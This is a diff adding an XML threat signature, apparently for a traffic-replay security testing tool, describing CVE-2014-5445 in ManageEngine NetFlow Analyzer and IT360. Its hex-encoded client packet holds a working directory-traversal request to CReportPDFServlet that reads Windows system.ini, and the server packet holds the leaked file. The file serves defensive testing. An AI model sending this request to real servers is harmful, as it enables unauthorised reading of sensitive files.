@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="ManageEngine NetFlow Analyzer And IT360 CReportPDFServlet Arbitrary File Download"/>
+    <EngDesc display="true" value="An arbitrary file download vulnerability exists in ManageEngine Netflow Analyzer and IT360. The vulnerability is due to lack of authentication and insufficient input validation on the &amp;quot;schFilePath&amp;quot; parameter sent to the CReportPDFServlet in HTTP requests. A remote unauthenticated attacker can download arbitrary files from arbitrary locations on the server by sending malicious requests to it. Tester should set $destPort to 8080 before test."/>
+    <Intent display="true">
+      <item value="DIRECTORY_TRAVERSAL"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="High"/>
+    <Known_Vendors_Affected display="true">
+      <item value="ManageEngine"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="IT360/NetFlow"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="10.4_and_prior/10.2_and_prior"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20141211-08"/>
+    <CVEID display="true" value="CVE-2014-5445"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="115341"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="352a96f668099cf8bdd6bf63b0f67c2d"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635578840959192868"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1422268214" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="B">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="A0:D3:C1:F1:4A:7D" destMac="00:50:56:B4:1F:3E" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00B6" Identification="BC57" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="1C2C" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="49982" destPort="$destPort" SeqNumber="B01276F5" AckNumber="8BE2D52E" HeaderLength="08" WindowSize="0073" Checksum="FC84" UrgentPointer="0000" Options="0101080ACD94CAA200000000" Payload="474554202F6E6574666C6F772F736572766C65742F435265706F7274504446536572766C65743F73636846696C65506174683D2E2E5C2E2E5C2E2E5C2E2E5C57696E646F77735C73797374656D2E696E69267064663D7472756520485454502F312E310D0A486F73743A203137322E31362E382E3135363A383038300D0A0D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:1F:3E" destMac="A0:D3:C1:F1:4A:7D" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="028A" Identification="3288" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="6427" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$destPort" destPort="49982" SeqNumber="8BE2D52E" AckNumber="B0127777" HeaderLength="08" WindowSize="FA6E" Checksum="4006" UrgentPointer="0000" Options="0101080A0043BED9CD94CAA2" Payload="485454502F312E3120323030204F4B0D0A5365727665723A204170616368652D436F796F74652F312E310D0A5365742D436F6F6B69653A204E46415F4A73657373696F6E3D45453434373833424343433034373543434139454634444135324239313841373B20506174683D2F6E6574666C6F770D0A5365742D436F6F6B69653A2069616D63737266636F6F6B69653D37393530363838662D663663642D343939382D393038642D6262316333303064656661343B20506174683D2F0D0A43616368652D436F6E74726F6C3A206D7573742D726576616C69646174650D0A457870697265733A205468752C203031204A616E20313937302030303A30303A303020474D540D0A436F6E74656E742D547970653A206170706C69636174696F6E2F7064663B636861727365743D5554462D380D0A436F6E74656E742D4C656E6774683A203233310D0A446174653A205468752C2031382044656320323031342031373A33343A343920474D540D0A0D0A3B20666F722031362D6269742061707020737570706F72740D0A0D0A5B647269766572735D0D0A776176653D6D6D6472762E646C6C0D0A74696D65723D74696D65722E6472760D0A0D0A5B6D63695D0D0A5B64726976657233325D0D0A5B333836656E685D0D0A776F61666F6E743D646F736170702E464F4E0D0A4547413830574F412E464F4E3D4547413830574F412E464F4E0D0A4547413430574F412E464F4E3D4547413430574F412E464F4E0D0A4347413830574F412E464F4E3D4347413830574F412E464F4E0D0A4347413430574F412E464F4E3D4347413430574F412E464F4E0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
